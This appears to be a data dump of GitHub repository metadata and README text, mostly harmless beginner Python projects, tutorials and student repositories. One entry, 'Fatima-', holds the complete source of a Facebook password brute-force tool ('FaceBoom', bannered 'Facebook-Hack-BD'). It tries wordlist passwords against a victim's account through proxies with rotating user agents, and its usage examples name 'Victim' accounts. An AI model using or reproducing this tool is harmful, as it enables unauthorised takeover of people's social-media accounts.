417290874;VidSynth;https://github.com/benblakemore/VidSynth;;2021-10-14T21:45:45Z;0;0;0;VidSynth Having a go at creating a video synthesiser using PyGame following makeartwithpython's tutorial (https://www.makeartwithpython.com/blog/video-synthesizer-in-python/) 
417208103;MorseinoGUI;https://github.com/JoaoFil/MorseinoGUI;Python;2021-10-14T16:40:18Z;0;0;0;
417289433;boas_vindas;https://github.com/VictorGM01/boas_vindas;Python;2021-10-14T21:38:49Z;1;1;0;Boas-vindas Veja este repositório se essa for a sua primeira vez aqui no meu perfil! Ele contém uma interface gráfica feita em Python para te recepcionar e explicar um pouco sobre meu trabalho aqui no Github, basta executá-lo! 
417239056;submarino-api;https://github.com/Los-had/submarino-api;Python;2021-10-14T18:21:07Z;1;1;0;submarino-api API for the submarino e-commerce documentation read the documentation in: https://submarino-api.herokuapp.com/docs or in https://submarino-api.herokuapp.com/redoc features  get all products by name get the first product by name save the product in submarino-api DB  installing on your machine download the project on github. $ git clone <repo url>  After that open your terminal and write: $ cd submarino-api     # enter in the app folder $ pip install -r requirements.txt     # install the dependencies $ uvicorn app:app --reload     # execute the app  This commands will execute the script in: http://127.0.0.1:8000  to stop the server(localhost) press Ctrl+C or Cmd+C Contributing Feel free to fork and make a pull request License MIT 
417292901;machine_learning_algorithms;https://github.com/SyedMuhammadMuhsinKarim/machine_learning_algorithms;Python;2021-10-14T21:55:33Z;0;0;0;Machine Learning Algorithms I code my mathematical understanding of machne learning algorithms. Unsupervised Learning Algorithms Clustering  Affinity Propagation Algorithm  Want to Connect with Me?: LinkedIn: https://www.linkedin.com/in/syedmohsinkarim/ 
417225275;universities_finder;https://github.com/OmarAEH/universities_finder;Python;2021-10-14T17:34:23Z;0;0;0;Universities finder A python based Selenium application which helps users to find directions to the nearest University via a Tkinter GUI.  User can Find the nearest University with a click of a button! Requirements:  Python 3.x. Google chrome driver is compatible with your browser.  
417227655;Mad-Libs-Generator;https://github.com/Archit1008/Mad-Libs-Generator;Python;2021-10-14T17:42:36Z;0;0;0;
417245041;David-Voice-Assitance;https://github.com/studentspalace/David-Voice-Assitance;Python;2021-10-14T18:42:03Z;0;0;0;David-Voice-Assitance Developed using Google speech recognition support for python. It controls the basic tasks of sending emails, opening Spotify, searching Google and Youtube for the user, and playing videos, opening URLs using voice commands. Opening basic applications like Code IDE etc. 
417236898;Cracow-Public-Transport-App;https://github.com/slavkoslavkoo/Cracow-Public-Transport-App;Python;2021-10-14T18:13:31Z;1;1;0;
417265418;AI-CA0;https://github.com/Mohammad-Hossein-Ataie/AI-CA0;Python;2021-10-14T19:57:42Z;0;0;0;
417196765;unleash-these-memes;https://github.com/paglia22/unleash-these-memes;Python;2021-10-14T16:04:43Z;1;1;0;"Unleash these memes! - Extracting topics from Reddit memes Nicolò Pagliari, June 2021 LUISS Guido Carli University ENG: How can brands analyze Internet memes to identify critiques or compliments about products or services? And how should they respond to those memes? These are the two research questions that I have chosen for my bachelor's degree thesis. To perform this research, I have used the PushShift API to develop a dataset of 17,000 brand memes retrieved from Reddit. The images have then been processed using OCR; in this way, I was able to convert the in-image text of each meme into a string. To identify consumer opinions, a topic extraction model has been developed based on these strings. In this GitHub page it is shown the whole Python code developed for this project.  ITA: In che modo le aziende possono analizzare i meme di Internet per identificare critiche e complimenti su prodotti e servizi? E come dovrebbero rispondere a questi meme? Queste sono le due research questions che ho scelto per la mia tesi di laurea. Per eseguire questa ricerca, ho utilizzato l'API PushShift per sviluppare un dataset di 17.000 meme recuperati da Reddit. Le immagini sono state poi elaborate tramite OCR; in questo modo, sono stato in grado di convertire il testo nell'immagine di ciascun meme in una stringa. Per identificare le opinioni dei consumatori, è stato sviluppato un modello di Topic Extraction basato su queste stringhe. In questa pagina di GitHub viene mostrato l'intero codice Python sviluppato per questo progetto. "
417267185;Fatima-;https://github.com/FatimaKabali/Fatima-;;2021-10-14T20:04:16Z;0;0;0;"Fatima- #!/usr/bin/python  import socket, sys, os, re, random, optparse, time if sys.version_info.major <= 2:import httplib else:import http.client as httplib  ## COLORS ############### wi=""\033[1;37m"" #>>White# rd=""\033[1;31m"" #>Red   # gr=""\033[1;32m"" #>Green # yl=""\033[1;33m"" #>Yellow# ######################### os.system(""cls||clear"") def write(text):     sys.stdout.write(text)     sys.stdout.flush()  versionPath = ""core""+os.sep+""version.txt""  errMsg = lambda msg: write(rd+""\n[""+yl+""!""+rd+""] Error: ""+yl+msg+rd+ "" !!!\n""+wi)  try:import requests except ImportError:     errMsg(""[ requests ] module is missing"")     print(""  [] Please Use: 'pip install requests' to install it :)"")     sys.exit(1)  try:import mechanize except ImportError:     errMsg(""[ mechanize ] module is missing"")     print(""  [] Please Use: 'pip install mechanize' to install it :)"")     sys.exit(1)  class FaceBoom(object):       def init(self):         self.useProxy = None         self.br = mechanize.Browser()         self.br.set_handle_robots(False)         self.br.factory.is_html = True         self.br.addheaders=[('User-agent',random.choice([                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',                'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',                'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',                'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))]       @staticmethod     def check_proxy(proxy):           proxies = {'https':""https://""+proxy, 'http':""http://""+proxy}           proxy_ip = proxy.split("":"")[0]           try:             r = requests.get('https://www.wikipedia.org',proxies=proxies, timeout=5)             if proxy_ip==r.headers['X-Client-IP']: return True             return False           except Exception : return False       @staticmethod     def cnet():         try:             socket.create_connection((socket.gethostbyname(""www.google.com""), 80), 2)             return True         except socket.error:pass         return False       def get_profile_id(self, target_profile):         try:             print(gr+""\n[""+wi+""""+gr+""] geting target Profile Id... please wait""+wi)             idre = re.compile('""entity_id"":""([0-9]+)""')             con = requests.get(target_profile).text             idis = idre.findall(con)             print(wi+""\n[""+gr+""+""+wi+""]""+gr+"" Target Profile""+wi+"" ID: ""+yl+idis[0]+wi)         except IndexError:             errMsg(""Please Check Your Victim's Profile URL"")             sys.exit(1)       def login(self,target, password):          try:             self.br.open(""https://facebook.com"")             self.br.select_form(nr=0)             self.br.form['email']=target             self.br.form['pass']= password             self.br.method =""POST""             if self.br.submit().get_data().contains(b'home_icon'):return  1             elif ""checkpoint"" in self.br.geturl(): return 2             return 0         except(KeyboardInterrupt, EOFError):             print(rd+""\n[""+yl+""!""+rd+""]""+yl+"" Aborting""+rd+""...""+wi)             time.sleep(1.5)             sys.exit(1)         except Exception as e:             print(rd+"" Error: ""+yl+str(e)+wi+""\n"")             time.sleep(0.60)       def banner(self,target,wordlist,single_passwd):          proxystatus = gr+self.useProxy+wi+""[""+gr+""ON""+wi+""]"" if self.useProxy  else yl+""[""+rd+""OFF""+yl+""]""         print(gr+"""""" ================================== [---]   """"""+wi+""""""CYBER_ROCKY""""""+gr+""""""        [---] ================================== [---]  """"""+wi+""""""Facebook-Hack-BD  """"""+gr+"""""" [---] ================================== [---]       """"""+yl+""""""CONFIG""""""+gr+""""""         [---] ================================== [>] Target      :> """"""+wi+target+gr+"""""" {}"""""".format(""[>] Wordlist    :> ""+yl+str(wordlist) if not single_passwd else ""[>] Password    :> ""+yl+str(single_passwd))+gr+"""""" [>] ProxyStatus :> """"""+str(proxystatus)+wi)         if not single_passwd:             print(gr+""""""\ ==================================""""""+wi+"""""" [] """"""+yl+""""""Facebook-""""""+rd+""""""Password-Attack: """"""+gr+""""""Enabled """"""+wi+""""""[]""""""+gr+"""""" ==================================\n""""""+wi)         else:print(""\n"")       @staticmethod     def updateFaceBoom():         if not os.path.isfile(versionPath):              errMsg(""Unable to check for updates: please re-clone the script to fix this problem"")              sys.exit(1)         write(""[~] Checking for updates...\n"")         conn = httplib.HTTPSConnection(""raw.githubusercontent.com"")         conn.request(""GET"", ""/Oseid/FaceBoom/master/core/version.txt"")         repoVersion = conn.getresponse().read().strip().decode()         with open(versionPath) as vf:             currentVersion = vf.read().strip()         if repoVersion == currentVersion:write(""  [] The script is up to date!\n"")         else:                 print(""  [+] An update has been found ::: Updating... "")                 conn.request(""GET"", ""/Oseid/FaceBoom/master/faceboom.py"")                 newCode = conn.getresponse().read().strip().decode()                 with open(""faceboom.py"", ""w"") as  faceBoomScript:                    faceBoomScript.write(newCode)                 with open(versionPath, ""w"") as ver:                      ver.write(repoVersion)                 write(""  [+] Successfully updated :)\n"")  parse = optparse.OptionParser(wi+"""""" Usage: python fb-hack-bd.py [OPTIONS...] ------------- OPTIONS:        |Facebook-accountðŸ’€HackingðŸ’€Tools.    ____      _                    ____            _  / |   | |   ___ _ __     |  _ \ ___   | | ___   _ | |  | | | | ' \ / _ \ '|| |) / _ \ / | |/ / | | | | || || | |) |  / | ||  _ < (_) | (|   <| || |  __, |./ _||       || __/ _||_\, |       |/                                           |__/ ............................................................        This is Cyber-Rocky Password Attack Tools.                  .....Made in Bangladesh.....       |--------     | -t <target email> [OR] <FACEBOOK ID>    ::> Specify target Email [OR] Target Profile ID     |--------     | -w <wordlist Path>                      ::> Specify Wordlist File Path     |--------     | -s <single password>                    ::> Specify Single Password To Check     |--------     | -p <Proxy IP:PORT>                      ::> Specify HTTP/S Proxy (Optional)     |--------     | -g <TARGET Facebook Profile URL>        ::> Specify Target Facebook Profile URL For Get HIS ID     |--------     | -u/--update                             ::> Update FaceBoom Script ------------- Examples:         |      |--------      |1/ python fb-hack-bd.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt      |--------      |*2/ python fb-hack-bd.py -t 100001013078780 -w /data/data/com.termux/files/home/password.txt      |--------      |3/ python fb-hack-bd.py -t Victim@hotmail.com -w \wordlist.txt -p 144.217.101.245:3129      |--------      |4/ python fb-hack-bd.py -t Victim@gmail.com -s 1234567      |--------      |5/ python fb-hack-bd.py -g https://www.facebook.com/Victim_Profile      |-------- """""")   def Main():    parse.add_option(""-t"",""--target"",'-T','--TARGET',dest=""target"",type=""string"",       help=""Specify Target Email or ID"")    parse.add_option(""-w"",""--wordlist"",'-W','--WORDLIST',dest=""wordlist"",type=""string"",       help=""Specify Wordlist File "")    parse.add_option(""-s"",""--single"",""--S"",""--SINGLE"",dest=""single"",type=""string"",       help=""Specify Single Password To Check it"")    parse.add_option(""-p"",""-P"",""--proxy"",""--PROXY"",dest=""proxy"",type=""string"",                         help=""Specify HTTP/S Proxy to be used"")    parse.add_option(""-g"",""-G"",""--getid"",""--GETID"",dest=""url"",type=""string"",                         help=""Specify TARGET FACEBOOK PROFILE URL to get his ID"")    parse.add_option(""-u"",""-U"",""--update"",""--UPDATE"", dest=""update"", action=""store_true"", default=False)    (options,args) = parse.parse_args()    faceboom = FaceBoom()    target = options.target    wordlist = options.wordlist    single_passwd = options.single    proxy = options.proxy    target_profile = options.url    update = options.update    opts = [target,wordlist,single_passwd, proxy, target_profile, update]    if any(opt for opt in opts):      if not faceboom.cnet():        errMsg(""Please Check Your Internet Connection"")        sys.exit(1)    if update:     faceboom.updateFaceBoom()     sys.exit(1)    elif target_profile:         faceboom.get_profile_id(target_profile)         sys.exit(1)    elif wordlist or single_passwd:         if wordlist:             if not os.path.isfile(wordlist):                 errMsg(""Please check Your Wordlist Path"")                 sys.exit(1)         if single_passwd:             if len(single_passwd.strip()) < 6:                 errMsg(""Invalid Password"")                 print(""[!] Password must be at least '6' characters long"")                 sys.exit(1)         if proxy:              if proxy.count(""."") != 3:                     errMsg(""Invalid IPv4 [""+rd+str(proxy)+yl+""]"")                     sys.exit(1)              print(wi+""[""+yl+""""+wi+""] Connecting To ""+wi+""Proxy[\033[1;33m {} \033[1;37m]..."".format(proxy if not "":"" in proxy else proxy.split("":"")[0]))              final_proxy = proxy+"":8080"" if not "":"" in proxy else proxy              if faceboom.check_proxy(final_proxy):                 faceboom.useProxy = final_proxy                 faceboom.br.set_proxies({'https':faceboom.useProxy, 'http':faceboom.useProxy})                 print(wi+""[""+gr+""Connected""+wi+""]"")              else:                 errMsg(""Connection Failed"")                 errMsg(""Unable to connect to Proxy[""+rd+str(proxy)+yl+""]"")                 sys.exit(1)          faceboom.banner(target,wordlist,single_passwd)         loop = 1 if not single_passwd else """"         if single_passwd:             passwords = [single_passwd]         else:             with open(wordlist, 'r', errors='replace') as f:                 passwords = f.readlines()         for passwd in passwords:                 passwd = passwd.strip()                 if len(passwd) <6:continue                 write(wi+""[""+yl+str(loop)+wi+""] Trying Password[ {""+yl+str(passwd)+wi+""} ]"")                 retCode = faceboom.login(target, passwd)                 if retCode:                     sys.stdout.write(wi+"" ==> Login""+gr+"" Success\n"")                     print(wi+""=========================""+""=""*len(passwd)+""======"")                     print(wi+""[""+gr+""+""+wi+""] Password [ ""+gr+passwd+wi+"" ]""+gr+"" Is Correct :)"")                     print(wi+""=========================""+""=""*len(passwd)+""======"")                     if retCode == 2:print(wi+""[""+yl+""!""+wi+""]""+yl+"" Warning: This account use (""+rd+""2F Authentication""+yl+""):""+rd+"" It's Locked""+yl+"" !!!"")                     break                 else:                     sys.stdout.write(yl+"" ==> Login""+rd+"" Failed\n"")                     loop = loop + 1 if not single_passwd else ""~""         else:                 if single_passwd:                     print(yl+""\n[""+rd+""!""+yl+""] Sorry: ""+wi+""The Password[ ""+yl+passwd+wi+"" ] Is Not Correct""+rd+"":(""+yl+""!""+wi)                     print(gr+""[""+yl+""!""+gr+""]""+yl+"" Please Try Another password or Wordlist ""+gr+"":)""+wi)                 else:                     print(yl+""\n[""+rd+""!""+yl+""] Sorry: ""+wi+""I Can't Find The Correct Password In [ ""+yl+wordlist+wi+"" ] ""+rd+"":(""+yl+""!""+wi)                     print(gr+""[""+yl+""!""+gr+""]""+yl+"" Please Try Another Wordlist. ""+gr+"":)""+wi)         sys.exit(1)    else:        print(parse.usage)        sys.exit(1)   if name=='main':     Main()   ############################################################## #####################                ######################### #####################   END OF TOOL  ######################### #####################                ######################### ############################################################## #This Tool by Oseid Aldary #Have a nice day :) #GoodBye "
417391556;Python-Brasil-2021;https://github.com/paulacampigotto/Python-Brasil-2021;Python;2021-10-15T06:30:50Z;8;8;4; Montando um Portfólio de Investimentos para Day Trade com Python Instruções: Para reproduzir o projeto no Google Colab, faça o download do repositório, crie uma pasta chamada pybr21 na raíz do seu Google Drive e faça o upload dos arquivos para esta pasta. Após isso, abra o Google Colab e faça upload do Notebook pybr21.ipynb, executando as células uma de cada vez e sequencialmente. O programa irá gerar um arquivo chamado arquivos/selected.txt, contendo as ações selecionadas para cada dia, o qual será utilizado pelo Algoritmo Genético para otimizar as proporçoes. Após a otimização, o gráfico de desempenho das carteiras/portfólios estará disponívem em graficos/return.png, e as carteiras selecionadas para cada dia e para cada execução estarão no arquivo final.txt. Neste repositório existem links para apresentação e slides ensinando como funciona o Aprendizado de Máquina utilizado para predição de preços de ações, caso tenha interesse em se aprofundar no assunto. 
417411954;Python;https://github.com/SorionsExe/Python;;2021-10-15T07:45:40Z;0;0;0;
417401753;python;https://github.com/Kavi011/python;Jupyter Notebook;2021-10-15T07:10:46Z;0;0;0;python 
417407842;Python;https://github.com/suwat9/Python;Python;2021-10-15T07:31:05Z;0;0;0;Python 
417348714;Python;https://github.com/JairGRC/Python;;2021-10-15T02:46:34Z;0;0;0;
417398718;python;https://github.com/duclongit95/python;Python;2021-10-15T07:00:12Z;0;0;0;
417352500;Python;https://github.com/harendra21/Python;Python;2021-10-15T03:05:02Z;0;0;1;Python Python programming tutorials with example  Make Your Own Chrome Browser with Python PyQt5 Face Recognition in Under 25 Lines of Python Code Create a Python-based Internet Speed Test GUI App: A Guide How to create a screen and webcam recorder using python Automate WhatsApp messages with python  
417411502;python;https://github.com/IlluaYuschenko15/python;;2021-10-15T07:44:12Z;0;0;0;
417368212;python;https://github.com/agunu2025/python;;2021-10-15T04:29:00Z;0;0;0;
417380318;Python;https://github.com/Qin1998Huo/Python;;2021-10-15T05:37:23Z;0;0;0;
417329555;Python;https://github.com/ArthurZuliani/Python;Python;2021-10-15T01:09:58Z;1;1;0;
417344485;python;https://github.com/krlsio/python;Python;2021-10-15T02:25:43Z;0;0;0;
417380777;Python;https://github.com/iBoundless/Python;;2021-10-15T05:39:57Z;0;0;0;Python 
417393582;python;https://github.com/Ram9500/python;Python;2021-10-15T06:39:30Z;0;0;0;
417371659;python;https://github.com/TenderY/python;;2021-10-15T04:48:43Z;0;0;0;
417351362;Python;https://github.com/xbwgo123/Python;;2021-10-15T02:59:56Z;0;0;0;Python Python_learning github_learning 
417408076;python;https://github.com/snbikash/python;;2021-10-15T07:31:53Z;0;0;2;python 
417403861;Python;https://github.com/Grevetail/Python;;2021-10-15T07:18:04Z;0;0;0;
417384673;Python;https://github.com/GrigorevMS/Python;Python;2021-10-15T05:59:55Z;0;0;0;
417317397;PythonExercise;https://github.com/ITlligent/PythonExercise;Python;2021-10-15T00:04:59Z;0;0;0;"Examples and exercises from the book ""Python for Network Engineers""     All examples and exercises have been tested in Python 3.7 and 3.8.  The assignments will be useful even if you are reading another Python book. All tasks are focused on network topics.  Links  Working environment Testing tasks with the pyneng utility  How to create your own repository for tasks  Git/Github basics  Creating a repository on GitHub To create your own repository based on a template, you need:  open tasks repo above the file list, click Use this template type a name for your repository click Create repository from template now you have a new repository with the same directory structure and files as pyneng-examples-exercises-en   Clone repository To work locally with the repository, you need to clone it. To do this, use the git clone command: $ git clone git@github.com:natenka/my_tasks.git Cloning into 'my_tasks'... remote: Counting objects: 241, done. remote: Compressing objects: 100% (191/191), done. remote: Total 241 (delta 43), reused 239 (delta 41), pack-reused 0 Receiving objects: 100% (241/241), 119.60 KiB | 0 bytes/s, done. Resolving deltas: 100% (43/43), done. Checking connectivity... done.  In the command output above, you need to change:  username natenka to your username on GitHub repository name my_tasks to the name of your repository  As a result, in the current directory where the git clone command was executed, a directory with the name of the repository will appear, in my case - ""my_tasks"". This directory now contains local copy of the repository with tasks. Tasks (exercises) The exercises directory contains tasks with numbers corresponding to the sections of the book. In addition, there are all additional files (configurations, etc.) that are used in tasks. Tests Starting from section “4. Data types in Python ”there are automated tests for testing tasks. They help to check whether everything matches the task, and also give feedback on what does not correspond to the task. As a rule, after the first period of adaptation to tests, it becomes easier to do tasks with tests. Testing is done using the pyneng utility. Learn more about how to work with the pyneng utility. "
417362383;PythonSyllabus;https://github.com/RiviCodes/PythonSyllabus;Python;2021-10-15T03:56:57Z;0;0;0;# PythonSyllabus This repository is intended to host most of the code I wrote while reading RunestoneAcademy's 'How to Think Like a Computer Scientist' interactive book. As stated in the Runestone Academy website, 'How to Think Like a Computer Scientist' interactive book is a product of the Runestone Interactive Project at Luther College, led by Brad Miller and David Ranum. Exercises are not my own, those can be found throughout the chapters of the book at https://runestone.academy. However, solutions in the form of code to those challenges were written by me. 
417350775;pythonTools;https://github.com/mOUNT41N/pythonTools;Python;2021-10-15T02:56:56Z;0;0;0;
417328588;python3710;https://github.com/python3710/python3710;;2021-10-15T01:05:12Z;0;0;0;
417338635;python2;https://github.com/sriyabetageri/python2;;2021-10-15T01:56:46Z;0;0;0;
417354840;pythonProject;https://github.com/newlifeinpeace/pythonProject;;2021-10-15T03:16:16Z;0;0;0;
417351410;PythonAlgorithm;https://github.com/SungHyunC/PythonAlgorithm;Python;2021-10-15T03:00:10Z;0;0;0;PythonAlgorithm 
417413327;pythonFile;https://github.com/Dabiaoge111/pythonFile;;2021-10-15T07:50:40Z;0;0;0;
417320454;PythonOOPiti;https://github.com/KhalilGazairly/PythonOOPiti;Python;2021-10-15T00:21:27Z;0;0;0;
417395540;PythonSQL;https://github.com/petrpan26/PythonSQL;Python;2021-10-15T06:47:39Z;0;0;0;PythonSQL A SQL engine written in Python 
417346890;PythonProjects;https://github.com/Ashusharmabuzz/PythonProjects;Python;2021-10-15T02:37:39Z;0;0;0;Python Projects This is My Personal Simple Python Projects Repository . Anyone can see , modify , reuse the code without any Permission :) 
417373005;pythonProject;https://github.com/wiutStudent/pythonProject;Python;2021-10-15T04:56:32Z;0;0;0;
417399535;PythonTutorial;https://github.com/Gemar30/PythonTutorial;Jupyter Notebook;2021-10-15T07:02:51Z;0;0;0;PythonTutorial Fundamental Part of python with some Activities 
417373978;PythonEjem;https://github.com/raul1424/PythonEjem;Python;2021-10-15T05:02:02Z;0;0;0;Hola Python 
417359764;pythonhw2;https://github.com/albhandari/pythonhw2;Python;2021-10-15T03:42:20Z;0;0;0;
417412436;pythonOhk;https://github.com/Self-Study-Programing/pythonOhk;;2021-10-15T07:47:24Z;0;0;0;
417372353;pythonProject;https://github.com/00012374/pythonProject;;2021-10-15T04:52:43Z;0;0;0;
417371872;PythonTWII_20211013;https://github.com/johnny91922/PythonTWII_20211013;;2021-10-15T04:50:03Z;0;0;0;
417370674;pythonProject1;https://github.com/00012504/pythonProject1;Python;2021-10-15T04:43:16Z;0;0;0;
417346443;PythonSavingsLHD;https://github.com/KanhaKorgaonkar/PythonSavingsLHD;Python;2021-10-15T02:35:32Z;0;0;0;
417398587;PythonWebScrapper;https://github.com/wdc35333/PythonWebScrapper;;2021-10-15T06:59:41Z;0;0;0;PythonWebScrapper Python Web Scrapper Study 
417370281;pythonPyChart;https://github.com/wiut12270/pythonPyChart;Python;2021-10-15T04:40:59Z;0;0;0;
417377807;PythonApp1;https://github.com/tocssharma/PythonApp1;Python;2021-10-15T05:23:34Z;0;0;0;
417336933;PythonFundamentosDSA;https://github.com/adilsonpsantos/PythonFundamentosDSA;;2021-10-15T01:47:37Z;0;0;0;
417370979;pythonProject1;https://github.com/wiutstudent14557/pythonProject1;Python;2021-10-15T04:44:58Z;0;0;0;
417392476;modern_python3_bootcamp;https://github.com/caamir/modern_python3_bootcamp;Python;2021-10-15T06:34:50Z;0;0;0;Modern Python3 Bootcamp 
417349229;PythonProject-1;https://github.com/siddhant0206/PythonProject-1;;2021-10-15T02:49:01Z;0;0;0;PythonProject-1 
417317081;PythonAnalisysFourier;https://github.com/JohnMendozaC/PythonAnalisysFourier;Python;2021-10-15T00:03:09Z;0;0;0;PythonAnalisysFourier 
417334278;python310-sample;https://github.com/eg-horinouchi/python310-sample;;2021-10-15T01:33:53Z;0;0;0;python310-sample python 3.10で追加された新機能を試してみる 
417323944;PythonDataStructureExercises;https://github.com/valfelix/PythonDataStructureExercises;Python;2021-10-15T00:40:21Z;0;0;0;
417370428;pythonProject1;https://github.com/wiutstudent00010959/pythonProject1;Python;2021-10-15T04:41:52Z;0;0;0;
417369727;pythonProject3;https://github.com/Aizhan86/pythonProject3;;2021-10-15T04:37:47Z;0;0;0;
417374399;pythonProject1;https://github.com/wiutStudent/pythonProject1;Python;2021-10-15T05:04:07Z;0;0;0;
417365424;PythonEcommerceWebsite;https://github.com/puzzlesolver/PythonEcommerceWebsite;;2021-10-15T04:12:42Z;0;0;0;PythonEcommerceWebsite E-Commerce Website using Python and Django Frontend: React.js Backend: Django DB: PostgreSQL 
417395574;Python-;https://github.com/kanggedegushi/Python-;;2021-10-15T06:47:45Z;0;0;0;
417357611;-python-;https://github.com/simongod11/-python-;;2021-10-15T03:30:21Z;1;1;0;
417397440;python-;https://github.com/matinasix/python-;;2021-10-15T06:55:20Z;0;0;0;python- python 
417342815;pythonJumpstartBuild10Apps;https://github.com/miinhuey/pythonJumpstartBuild10Apps;Python;2021-10-15T02:17:22Z;0;0;0;pythonJumpstartBuild10Apps Source from https://training.talkpython.fm/courses/details/python-language-jumpstart-building-10-apps 
417333435;pythonidta;https://github.com/brandon495381/pythonidta;;2021-10-15T01:30:10Z;0;0;0;
417335684;pythonlearning;https://github.com/dannypanjaitan/pythonlearning;;2021-10-15T01:41:29Z;0;0;0;
417369303;pythonsample;https://github.com/govardhancu/pythonsample;;2021-10-15T04:35:11Z;0;0;0;
417343395;sqlite_python;https://github.com/kcoleman80/sqlite_python;Jupyter Notebook;2021-10-15T02:20:22Z;0;0;0;
417367934;PYTHON-COURSE;https://github.com/deepak0358/PYTHON-COURSE;Jupyter Notebook;2021-10-15T04:27:12Z;0;0;0;
417372799;python_loop;https://github.com/Sharma-tanu/python_loop;;2021-10-15T04:55:28Z;0;0;0;
417401435;PYTHON-FILTROS;https://github.com/Tito-DM/PYTHON-FILTROS;Python;2021-10-15T07:09:36Z;0;0;0;
417354963;MVCrequestsPython;https://github.com/HasinJ/MVCrequestsPython;HTML;2021-10-15T03:16:53Z;0;0;0;MVCrequestsPython 
417327560;python-csv;https://github.com/valentina-l/python-csv;;2021-10-15T01:00:11Z;0;0;0;
417399839;Python_prjct;https://github.com/hasanchamdany/Python_prjct;Python;2021-10-15T07:03:49Z;0;0;0;
417396735;HelloPython;https://github.com/t19cs036/HelloPython;;2021-10-15T06:52:32Z;0;0;0;
417384894;python_test;https://github.com/namth2015/python_test;;2021-10-15T06:00:53Z;0;0;0;
417400224;python-repo;https://github.com/muharyns/python-repo;Python;2021-10-15T07:05:10Z;0;0;0;
417416733;python-oop;https://github.com/WreetSarker/python-oop;;2021-10-15T08:01:39Z;0;0;0;
417334594;python-alexa;https://github.com/niscee/python-alexa;;2021-10-15T01:35:35Z;0;0;0;
417384033;Python-Codes;https://github.com/lodyne/Python-Codes;Python;2021-10-15T05:56:51Z;0;0;0;Python-Codes 
417415936;BasicPython;https://github.com/raqsutin/BasicPython;Jupyter Notebook;2021-10-15T07:59:12Z;0;0;0;
417369431;python-tutorial;https://github.com/sarathkRamesh/python-tutorial;Python;2021-10-15T04:35:47Z;0;0;0;python-tutorial 
417327588;python_art;https://github.com/NikkiHmltn/python_art;;2021-10-15T01:00:20Z;0;0;0;python_art This is a repo to practice making art with python 
417413840;python-Ohk;https://github.com/baejin1018/python-Ohk;Python;2021-10-15T07:52:23Z;0;0;0;
417375852;python_pf;https://github.com/fractalzer/python_pf;;2021-10-15T05:12:24Z;1;1;0;Python 🔷  This is my portfolio as a python developer. From this portfolio, you can rate my skills.  The number of people who are viewing this repository now    
417378589;python_things;https://github.com/jangel347/python_things;Python;2021-10-15T05:27:39Z;0;0;0;
417381497;python-projects;https://github.com/blockofdynamite/python-projects;Python;2021-10-15T05:43:32Z;0;0;0;
417408492;CrazyPython;https://github.com/Everything-is-one/CrazyPython;;2021-10-15T07:33:32Z;0;0;0;CrazyPython 疯狂Python学习笔记 这是一个关于Python编程语言的学习过程记录。 
417391316;python-test;https://github.com/SocFoot/python-test;Makefile;2021-10-15T06:29:50Z;0;0;0;Python Project Template A low dependency and really simple to start project template for Python Projects. See also  Flask-Project-Template for a full feature Flask project including database, API, admin interface, etc. FastAPI-Project-Template The base to start an openapi project featuring: SQLModel, Typer, FastAPI, JWT Token Auth, Interactive Shell, Management Commands.  HOW TO USE THIS TEMPLATE  DO NOT FORK this is meant to be used from Use this template feature.   Click on Use this template Give a name to your project (e.g. my_awesome_project recommendation is to use all lowercase and underscores separation for repo names.) Wait until the first run of CI finishes (Github Actions will process the template and commit to your new repo) If you want codecov Reports and Automatic Release to PyPI On the new repository settings->secrets add your PIPY_API_TOKEN and CODECOV_TOKEN (get the tokens on respective websites) Read the file CONTRIBUTING.md Then clone your new project and happy coding!   NOTE: WAIT until first CI run on github actions before cloning your new project.  What is included on this template?  🖼️ Templates for starting multiple application types:  Basic low dependency Python program (default) use this template Flask with database, admin interface, restapi and authentication use this template. or Run make init after cloning to generate a new project based on a template.   📦 A basic setup.py file to provide installation, packaging and distribution for your project. Template uses setuptools because it's the de-facto standard for Python packages, you can run make switch-to-poetry later if you want. 🤖 A Makefile with the most useful commands to install, test, lint, format and release your project. 📃 Documentation structure using mkdocs 💬 Auto generation of change log using gitchangelog to keep a HISTORY.md file automatically based on your commit history on every release. 🐋 A simple Containerfile to build a container image for your project. Containerfile is a more open standard for building container images than Dockerfile, you can use buildah or docker with this file. 🧪 Testing structure using pytest ✅ Code linting using flake8 📊 Code coverage reports using codecov 🛳️ Automatic release to PyPI using twine and github actions. 🎯 Entry points to execute your program using python -m <python_test> or $ python_test with basic CLI argument parsing. 🔄 Continuous integration using Github Actions with jobs to lint, test and release your project on Linux, Mac and Windows environments.   Curious about architectural decisions on this template? read ABOUT_THIS_TEMPLATE.md If you want to contribute to this template please open an issue or fork and send a PULL REQUEST.  ❤️ Sponsor this project  python_test   Awesome python_test created by SocFoot Install it from PyPI pip install python_test Usage from python_test import BaseClass from python_test import base_function  BaseClass().base_method() base_function() $ python -m python_test #or $ python_test Development Read the CONTRIBUTING.md file. 
417391019;Python_AIML;https://github.com/binoykb/Python_AIML;Jupyter Notebook;2021-10-15T06:28:30Z;0;0;0;
417369425;python-demo;https://github.com/Sreeharipkd/python-demo;Python;2021-10-15T04:35:46Z;0;0;0;python-demo 
417396943;HelloPython;https://github.com/t19cs060/HelloPython;;2021-10-15T06:53:23Z;0;0;0;
417410890;Python_Predict;https://github.com/KabeloMbewe/Python_Predict;Jupyter Notebook;2021-10-15T07:42:14Z;0;0;0; 
417332314;python_prac;https://github.com/nekonamic/python_prac;Python;2021-10-15T01:25:06Z;0;0;0;
417326379;Python-Study;https://github.com/wenfengwu/Python-Study;;2021-10-15T00:53:37Z;0;0;0;
